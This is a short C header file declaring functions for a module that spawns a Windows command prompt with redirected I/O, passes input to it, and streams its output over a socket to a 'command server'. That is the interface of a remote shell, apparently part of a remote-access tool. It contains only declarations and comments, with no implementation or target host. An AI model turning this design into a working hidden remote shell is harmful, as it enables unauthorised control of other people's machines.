/*
	Header file for cmd.c
*/

#pragma once

/*
* Initialize the module. This consists of 2 main actions:
*   1) Spawn a command prompt process with redirected I/O
*   2) Start a thread to constantly send the command prompt's output back to the command server
*
* parameters:
*	[in] sock - the socket to send the command prompt output to
* returns:
*	true on success, false on failure
*   in the case of failure, the error is logged automatically
*/
BOOL startCMD(SOCKET sock);

/*
* Spawn a command prompt with redirected I/O
*
* parameters:
*	N/A
* returns:
*	true on success, false on failure
*   in the case of failure, the error is logged automatically
*/
BOOL createCommandPrompt();

/*
* Send a string of input to the child command prompt process
* NOTE: The input is NOT automatically entered. Newlines must be provided manually
*
* parameters:
*	[in] buff - the buffer containing the input string
*   [in] inputLen - the length of the input string
* returns:
*	true on success, false on failure
*   in the case of failure, the error is logged automatically
*/
BOOL inputToCMD(char* buff, int inputLen);

/*
* Function to run the command prompt output thread. Output will be continuously read from command prompt
*   and sent to the command server using the socket provided to startCMD()
*
* parameters:
*	[in] lpParam - thread parameters (this is unused since the thread can access the cmd globals struct)
* returns:
*	0 when exiting due to command prompt closing, otherwise returns the last error code
*/
DWORD WINAPI cmdOutputThread(LPVOID lpParam);